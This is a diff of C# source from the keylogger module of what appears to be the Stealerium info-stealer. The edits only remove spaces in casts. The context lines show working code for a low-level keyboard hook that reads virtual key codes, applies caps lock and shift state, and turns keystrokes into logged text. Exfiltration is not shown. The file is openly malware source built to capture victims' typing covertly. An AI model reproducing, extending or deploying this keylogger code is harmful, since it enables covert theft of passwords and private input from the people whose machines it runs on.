@@ -70,11 +70,11 @@ namespace Stealerium.Modules.Keylogger
             if (!KeyloggerEnabled)
                 return IntPtr.Zero;
 
-            if (nCode < 0 || wParam != (IntPtr) WmKeydown) return CallNextHookEx(_hookId, nCode, wParam, lParam);
+            if (nCode < 0 || wParam != (IntPtr)WmKeydown) return CallNextHookEx(_hookId, nCode, wParam, lParam);
             var vkCode = Marshal.ReadInt32(lParam);
             var capsLock = (GetKeyState(0x14) & 0xffff) != 0;
             var shiftPress = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
-            var currentKey = KeyboardLayout((uint) vkCode);
+            var currentKey = KeyboardLayout((uint)vkCode);
 
             if (capsLock || shiftPress)
                 currentKey = currentKey.ToUpper();
@@ -82,11 +82,11 @@ namespace Stealerium.Modules.Keylogger
                 currentKey = currentKey.ToLower();
 
 
-            if ((Keys) vkCode >= Keys.F1 && (Keys) vkCode <= Keys.F24)
-                currentKey = "[" + (Keys) vkCode + "]";
+            if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
+                currentKey = "[" + (Keys)vkCode + "]";
 
             else
-                switch (((Keys) vkCode).ToString())
+                switch (((Keys)vkCode).ToString())
                 {
                     case "Space":
                         currentKey = " ";
@@ -164,7 +164,7 @@ namespace Stealerium.Modules.Keylogger
                 // ignored
             }
 
-            return ((Keys) vkCode).ToString();
+            return ((Keys)vkCode).ToString();
         }
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
